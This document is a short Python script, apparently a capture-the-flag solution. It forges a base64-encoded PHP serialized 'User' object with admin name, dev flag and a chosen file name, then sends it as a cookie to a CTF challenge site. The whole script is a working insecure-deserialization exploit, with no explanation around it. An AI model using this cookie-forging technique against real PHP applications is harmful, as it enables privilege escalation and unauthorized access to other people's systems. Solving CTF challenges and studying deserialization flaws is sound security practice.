import requests
import base64

dev_str = 'Tzo0OiJVc2VyIjo1OntzOjQ6Im5hbWUiO3M6NDoiaGloaSI7czozOiJkZXYiO2I6MTtzOjU6ImZpbGVzIjthOjE6e2k6MDtzOjU6ImZpbGUxIjt9czoyOiJkbyI7YTowOnt9czo0OiJ1bmRvIjthOjA6e319'

payload = 'hoho.php'
decoded = 'O:4:"User":5:{s:4:"name";s:5:"admin";s:3:"dev";b:1;s:5:"files";a:1:{i:0;s:'+str(len(payload))+':"'+payload+'";}s:2:"do";a:0:{}s:4:"undo";a:0:{}}'
encoded = base64.b64encode(decoded.encode()).decode()

print(encoded)


url = 'https://phptexteditor.unitedctf.ca/'
cookies = {'profile': encoded}
resp = requests.get(url, cookies=cookies)